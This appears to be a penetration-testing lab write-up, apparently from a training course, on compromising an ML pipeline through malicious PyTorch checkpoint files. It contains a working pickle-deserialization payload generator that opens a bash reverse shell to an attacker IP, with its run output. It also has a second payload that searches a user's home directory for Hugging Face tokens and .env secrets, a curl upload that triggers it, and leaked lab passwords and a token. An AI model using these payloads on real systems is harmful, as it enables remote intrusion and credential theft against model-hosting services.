
```
git clone http://andres.mahone:Mah0ne123%23@192.168.50.20/biogenai/ml-pipeline.git
```

After enumerating models git, we discovered potentiall RCE in readme.md. Thats a scripts that creating payload from Kali:

```
#!/usr/bin/env python3
import torch, os, sys

LHOST = sys.argv[1] if len(sys.argv) > 1 else "192.168.45.171"
LPORT = sys.argv[2] if len(sys.argv) > 2 else "80"
OUT   = sys.argv[3] if len(sys.argv) > 3 else "resnet18_epoch_099.pt"

class M:
    def __reduce__(self):
        return (os.system, (
            f"python3 -c '"
            f"import socket,subprocess,os;"
            f"s=socket.socket();"
            f"s.connect((\"{LHOST}\",{LPORT}));"
            f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            f"subprocess.call([\"/bin/bash\",\"-i\"])"
            f"'",))

torch.save(M(), OUT)
print(f"[+] {OUT} ({os.path.getsize(OUT)} bytes) -> {LHOST}:{LPORT}")
```

```
python3 -m venv venv 
source venv/bin/activate  
pip install torch       
```
```
p
~/osai 2m 33s                                                                                              13:19:01
osai ❯ python3 gen.py   
/home/kali/osai/venv/lib/python3.13/site-packages/torch/_subclasses/functional_tensor.py:368: UserWarning: Failed to initialize NumPy: No module named 'numpy' (Triggered internally at /__w/pytorch/pytorch/torch/csrc/utils/tensor_numpy.cpp:84.)
  cpu = _conversion_method_template(device=torch.device("cpu"))
[+] resnet18_epoch_099.pt (1519 bytes) -> 192.168.45.171:80

passes: MLeng.2099

scp resnet18_epoch_099.pt mleng@192.168.174.21:/srv/models/

```

Objective 2 how was done : 

Generating payload on kali with :

```
scp /tmp/evil.pt jaimie@13.217.160.131:/tmp/evil.pt
```

```
python3 -c "
import torch, os

class Exploit:
    def __reduce__(self):
        cmd = '''
find /home/saidi -name 'token' 2>/dev/null > /tmp/tok.txt
find /home/saidi -name '*.env' 2>/dev/null >> /tmp/tok.txt
find /home/saidi -name '.env' 2>/dev/null >> /tmp/tok.txt
grep -r 'hf_' /home/saidi/ 2>/dev/null >> /tmp/tok.txt
cat /home/saidi/.cache/huggingface/token >> /tmp/tok.txt
cat /home/saidi/.huggingface/token >> /tmp/tok.txt
chmod 777 /tmp/tok.txt
'''
        return (os.system, (cmd,))

padding = torch.zeros(300000)
payload = {
    'model_state_dict': Exploit(),
    'epoch': 1,
    'optimizer_state_dict': {},
    'padding': padding
}
torch.save(payload, '/tmp/evil.pt')
print('done')
"
```
trigger :
```
curl -s -X POST http://localhost:5000/upload \
  -F "checkpoint=@/tmp/evil.pt;filename=evil.pt"
```
Extracted token : 
```
jaimie@biogenai:/tmp$ cat tok.txt 
/home/saidi/.bashrc:export HF_TOKEN=hf_BioGenAI_saidi_4a8b2c1d3e5f
```
